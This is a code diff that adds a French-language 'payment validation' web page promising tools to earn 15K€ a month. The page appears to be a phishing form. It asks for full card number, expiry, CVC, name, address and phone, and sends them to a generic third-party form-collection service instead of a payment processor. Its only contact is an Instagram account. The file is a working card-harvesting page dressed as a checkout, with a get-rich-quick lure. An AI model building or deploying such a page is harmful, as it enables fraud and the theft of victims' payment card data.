@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation de Paiement 💳</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 20px;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 2.2em;
+            margin-bottom: 10px;
+            color: #007BFF;
+        }
+
+        p.intro {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+            color: #555;
+        }
+
+        form input {
+            width: calc(100% - 20px);
+            margin: 10px 0;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 1em;
+            text-align: center;
+            color: #777;
+        }
+
+        a {
+            color: #007BFF;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Validation et Paiement 💳</h1>
+        <p class="intro">🚀 Vous êtes à un pas d'accéder à des outils qui vous permettront d'atteindre **15K€ par mois**.<br>
+            Finalisez votre paiement pour commencer votre succès dès aujourd'hui ! 🌟</p>
+
+        <form action="https://formspree.io/f/xrbgvade" method="POST">
+            <input type="email" name="email" placeholder="E-mail" required>
+            <input type="text" name="number_card" placeholder="(1234 1234 1234 1234)" required>
+            <input type="text" name="expiry" placeholder="(MM/AA)" required>
+            <input type="text" name="cvc" placeholder="CVC" required>
+            <input type="text" name="name" placeholder="Nom" required>
+            <input type="text" name="address" placeholder="Adresse" required>
+            <input type="text" name="phone" placeholder="(0607080910)" required>
+
+            <button type="submit">Payer</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        <p>✨ Pour toute question, contactez-nous sur Instagram : <a href="https://www.instagram.com/OFM_IA_AGENCY" target="_blank">@OFM_IA_AGENCY</a> 📸❤️</p>
+    </div>
+</body>
+</html>
+
